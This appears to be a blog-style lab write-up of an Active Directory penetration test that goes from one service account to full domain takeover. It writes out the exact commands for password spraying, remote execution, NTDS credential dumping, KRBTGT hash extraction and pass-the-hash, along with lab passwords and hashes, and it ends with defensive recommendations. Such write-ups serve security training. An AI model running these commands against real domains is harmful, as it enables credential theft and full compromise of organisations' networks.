---
layout: post
title: "Active Directory Domain Compromise: From Valid Credentials to Full Domain Takeover"
date: 2026-07-22
---

## Introduction

In this lab, I ran an Active Directory penetration test against a Windows Domain Controller, starting with a single set of valid low-privilege credentials. The goal was to see how far one compromised service account could take an attacker inside the domain — and it turned out to be all the way to a full domain takeover.

By the end of the engagement I had:

- Enumerated domain users and computers
- Found a password reuse issue between two accounts
- Escalated to administrative access on the Domain Controller
- Dumped the full Active Directory password database (NTDS)
- Extracted the KRBTGT hash
- Authenticated as Administrator using Pass-the-Hash, with no plaintext password needed

Here's the full walkthrough.

### Lab environment

| | |
|---|---|
| **Domain** | `DRY.MARTINI.BARS` |
| **Domain Controller** | `DC01` — `10.1.221.180` |
| **Starting credentials** | `ATHENA_SVC` / `1dirtymartini` |

---

## Step 1 — Initial LDAP Enumeration

First thing I did was validate the credentials I'd been given and pull down a list of domain users over LDAP.

```bash
nxc ldap 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --users
```

The credentials checked out, and this returned several accounts worth noting for later:

- `Administrator`
- `Guest`
- `krbtgt`
- `mprice`
- `athena.t0`
- `ATHENA_SVC`

**📸 Screenshot here:** terminal output showing the command and the returned user list.

---

## Step 2 — Enumerating Domain Computers

Next I queried AD for computer objects, to see what was actually sitting on the network.

```bash
nxc ldap 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --query "(objectClass=computer)" ""
```

Two machines came back:

- `DC01`
- `EVILPC`

`DC01.DRY.MARTINI.BARS` was clearly the Domain Controller, so that became the primary target.

**📸 Screenshot here:** command + the two returned computer objects.

---

## Step 3 — SMB Share Enumeration

With a valid account in hand, I checked what shares were reachable.

```bash
nxc smb 10.1.221.180 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS --shares
```

Shares found:

- `ADMIN$`
- `C$`
- `IPC$`
- `NETLOGON`
- `notes`
- `SYSVOL`

The `notes` share stood out — `ATHENA_SVC` had **READ/WRITE** on it, which is worth flagging on its own as a potential foothold for dropping payloads or reading sensitive files.

**📸 Screenshot here:** share listing, with `notes` permissions visible.

---

## Step 4 — Password Reuse Testing (the real turning point)

This is where the lab actually broke open. I built a small user list from the accounts discovered in Step 1:

```
Administrator
mprice
athena.t0
ATHENA_SVC
```

Then sprayed the one known password across the subnet against all of them:

```bash
crackmapexec smb 10.1.221.0/24 -u users.txt -d DRY.MARTINI.BARS -p '1dirtymartini'
```

One hit stood out immediately:

```
DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```

`athena.t0` was reusing the exact same password as the service account — and as I confirmed next, this account had admin rights on the DC. Classic password reuse turning a low-priv foothold into a domain-level problem.

**📸 Screenshot here (⭐ must-have):** the `(Pwn3d!)` line for `athena.t0`.

---

## Step 5 — Confirming Administrative Access

With `athena.t0`'s credentials, I checked what access level this actually granted.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --shares
```

```
ADMIN$   READ,WRITE
C$       READ,WRITE
```

Full read/write on `ADMIN$` and `C$` confirmed administrative-level access on the Domain Controller.

**📸 Screenshot here (⭐ must-have):** the `ADMIN$` / `C$` permissions output.

---

## Step 6 — Proving Remote Command Execution

To confirm this wasn't just share access but actual code execution, I ran a command directly on the DC:

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' -x "whoami"
```

```
dry\athena.t0
```

At this point the Domain Controller was fully compromised with administrative privileges.

**📸 Screenshot here:** the `whoami` output confirming execution as `athena.t0`.

---

## Step 7 — Extracting Active Directory Password Hashes (NTDS)

With admin access confirmed, I pulled the entire AD password database.

```bash
crackmapexec smb 10.1.221.180 -u athena.t0 -d DRY.MARTINI.BARS -p '1dirtymartini' --ntds
```

This dumped hashes for every account in the domain, including:

- `Administrator`
- `krbtgt`
- `mprice`
- `athena.t0`
- `ATHENA_SVC`
- `DC01$`
- `EVILPC$`

**📸 Screenshot here (⭐⭐⭐ must-have):** the NTDS dump showing the account list and hashes.

---

## Step 8 — Obtaining the KRBTGT Hash

Buried in that NTDS dump was the account that matters most for long-term persistence:

```
krbtgt:502
```

NT hash:

```
22ebc290e67668629c8d0812662a9c51
```

The KRBTGT hash is the key to forging Kerberos tickets (Golden Tickets), which means an attacker with this hash can mint valid domain authentication essentially at will — persistence that survives password resets on individual accounts.

**📸 Screenshot here:** the KRBTGT line from the NTDS dump, highlighted.

---

## Step 9 — Pass-the-Hash to Administrator

Finally, I took the Administrator's NT hash straight from the dump and authenticated with it — no plaintext password required.

```
d5cad8a9782b2879bf316f56936f1e36
```

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS
```

```
DRY.MARTINI.BARS\Administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
```

**📸 Screenshot here (⭐⭐⭐ must-have):** Administrator `(Pwn3d!)` via hash, no password.

Then confirmed it with command execution:

```bash
crackmapexec smb 10.1.221.180 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 -d DRY.MARTINI.BARS -x "whoami"
```

```
dry\administrator
```

**📸 Screenshot here (⭐⭐⭐ must-have):** `whoami` returning `dry\administrator`.

---

## Attack Path Summary

```
ATHENA_SVC credentials
        │
        ▼
LDAP enumeration → user & computer discovery
        │
        ▼
Password reuse → athena.t0 admin access
        │
        ▼
NTDS hash extraction
        │
        ▼
KRBTGT hash exposed
        │
        ▼
Pass-the-Hash → Administrator
        │
        ▼
Full domain compromise
```

---

## Troubleshooting Along the Way

Not everything worked on the first try — worth documenting since it's part of the real process:

**BloodHound collection failed.**

```bash
bloodhound-python -u athena.t0 -p '1dirtymartini' -d DRY.MARTINI.BARS -ns 10.1.221.180 -c All
```

This was refused because LDAP signing was enforced on the DC, which blocks standard unsigned LDAP collection.

**Direct SMB share access with the hash alone failed initially.**

```bash
smbclient //10.1.221.180/notes -U "DRY.MARTINI.BARS/Administrator"
```

This failed because `smbclient` was expecting a password, not an NT hash — a reminder to use the right flag/tool for hash-based auth rather than assuming every tool accepts hashes the same way.

---

## Security Impact

The root causes behind this compromise:

- Weak password management
- Password reuse between a service account and a privileged domain account
- Excessive privileges assigned to a user account that didn't need DC-level admin rights

Starting from a single compromised credential, this chain led to full administrative access on the Domain Controller, extraction of every password hash in the domain, and exposure of the KRBTGT account — effectively total compromise of Active Directory.

## Recommendations

- Enforce unique passwords across all accounts — no reuse between service accounts and user accounts
- Implement stronger password policies (length, complexity, rotation where appropriate)
- Reduce unnecessary administrative privileges — apply least privilege to service and user accounts
- Monitor for abnormal SMB authentication activity, especially spray patterns across a subnet
- Protect service accounts using gMSA (Group Managed Service Accounts) instead of static passwords
- Enable MFA for privileged accounts wherever technically feasible in AD
- Regularly audit Active Directory permissions and group memberships
